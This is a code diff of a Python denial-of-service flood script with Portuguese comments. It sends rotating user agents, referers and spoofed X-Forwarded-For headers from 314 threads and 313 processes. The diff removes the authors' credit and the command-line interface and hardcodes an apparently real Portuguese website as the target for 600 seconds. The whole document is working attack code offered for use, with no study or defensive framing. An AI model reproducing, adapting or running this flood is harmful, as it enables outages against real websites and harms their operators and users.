@@ -1,12 +1,10 @@
-# Script created by @seyzalel & @leif_saintz
-
 import requests
 import threading
 import multiprocessing
 import random
-import argparse
 import time
 
+# Lista de user agents e referers
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -25,7 +23,7 @@ referers = [
     "http://www.aol.com"
 ]
 
-# Função de ataque com ofuscação e autenticação de cookies (@seyzalel)
+# Função de ataque com ofuscação e autenticação de cookies
 def flood(target_url, duration):
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -43,13 +41,13 @@ def flood(target_url, duration):
                 "Pragma": "no-cache",
                 "Upgrade-Insecure-Requests": "1"
             }
-            # Cabeçalhos extras de ofuscação (@seyzalel)
+            # Adiciona cabeçalhos extras de ofuscação
             headers["X-Requested-With"] = "XMLHttpRequest"
             headers["Origin"] = "http://example.com"
             headers["DNT"] = "1"
             headers["X-Forwarded-For"] = "127.0.0.1"
 
-            # Autenticação de cookies (@seyzalel)
+            # Autenticação de cookies
             cookies = {
                 "sessionid": "1234567890abcdef"
             }
@@ -62,17 +60,13 @@ def flood(target_url, duration):
         except requests.exceptions.RequestException as e:
             print(f"An error occurred: {e}")
 
-parser = argparse.ArgumentParser(description="HTTP Bypass DoS attack script")
-parser.add_argument("url", type=str, help="The target URL to attack")
-parser.add_argument("duration", type=int, help="The duration of the attack in seconds")
-args = parser.parse_args()
-
-# Configurações do ataque (@seyzalel)
-target_url = args.url
-duration = args.duration
+# Configurações do ataque
+target_url = "https://agrcbt.pt/"
+duration = 600
 num_threads = 314
 num_processes = 313
 
+# Inicia os threads e processos
 threads = []
 processes = []
 for _ in range(num_threads):
@@ -85,6 +79,7 @@ for _ in range(num_processes):
     processes.append(process)
     process.start()
 
+# Aguarda os threads e processos terminarem
 for thread in threads:
     thread.join()
 
